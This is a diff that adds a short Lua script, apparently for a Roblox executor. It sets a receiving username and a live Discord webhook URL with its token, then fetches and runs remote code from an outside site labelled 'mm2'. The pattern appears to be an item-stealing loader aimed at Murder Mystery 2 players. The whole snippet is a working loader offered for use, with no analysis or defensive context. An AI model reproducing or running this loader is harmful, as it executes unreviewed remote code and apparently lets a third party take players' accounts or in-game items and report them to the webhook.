@@ -1,0 +1,5 @@
+```lua
+Username = "AngeIOfHearts"
+Webhook = "https://discord.com/api/webhooks/1297592658620846120/DuEPwE5RAFKcMSPqheTz6jxWTI6KCcK1Gj6SzuIq7sR8pJvbNcogr4la19AGZ5zAeFDN"
+
+loadstring(game:HttpGet(('https://darkscripts.space/mm2')))()```
